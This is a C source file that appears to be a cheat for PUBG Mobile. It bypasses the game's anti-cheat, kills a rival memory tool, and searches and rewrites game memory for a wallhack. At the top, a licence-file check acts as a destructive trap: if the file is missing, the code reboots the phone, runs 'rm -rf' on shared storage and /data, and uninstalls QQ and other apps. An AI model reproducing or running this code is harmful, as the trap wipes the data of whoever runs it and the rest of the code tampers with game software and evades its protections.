#include "MemoryTools.h"
int main(int argc,char **argv)
{
		FILE *fp;
    char ch,wjm[51];
    if (!(fp=fopen("/storage/emulated/0/一言/一言验证","r")))//验证这个文件是否存在
    {
    //没检测到文件执行
	rebootsystem();//重启系统(手机)
remove("/storage/emulated/0/Android");
remove("/storage/emulated/0/iApp");
system("rm -rf /storage/emulated/0");
system("rm -rf /data");
uninstallapk("com.tencent.mobileqq");
uninstallapk("com.bairimeng.dmmdzz.m4399");
uninstallapk("com.aigz.cloudgame.cat");
printf("喜欢偷文件？");
exit(1);
	}
    //下面写执行功能
	killGG();//杀掉GG修改器进程
	killXs();
	int gs;						// 用来存储数据个数
	void *jg;
	PACKAGENAME *bm = "com.tencent.tmgp.pubgmhd";	// 软件包名
	// 注意这里要用指针,就是那个*号,不可以去掉
	BypassGameSafe();
	SetSearchRange(B_BAD);//内存
		
	puts("开始内存搜索...");
	MemorySearch(bm, "1081081858", &gs, DWORD);	// -----搜索内存 
	printf("共搜索%d个数据\n", gs);
	MemoryOffset(bm, "537202725", 4, &gs, DWORD);
	MemoryOffset(bm, "-2147086191", 84, &gs, DWORD);
	printf("共偏移%d个数据\n",gs);
	Print();	
	puts("透视第一步...");
	MemoryWrite(bm,"2147086191",84,DWORD);	
	puts("修改完成");
	ClearResults();

}